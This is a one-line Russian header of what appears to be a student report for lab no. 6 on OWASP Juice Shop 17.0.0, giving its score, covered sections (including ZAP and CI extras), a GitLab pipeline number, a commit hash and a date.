*Отчёт: лабораторная № 6, OWASP Juice Shop 17.0.0, **4 балла** (базовая §5–7 + доп. ZAP/CI §8–9). Pipeline GitLab **#59**, commit `0b9f0ba33`, 21.05.2026.*
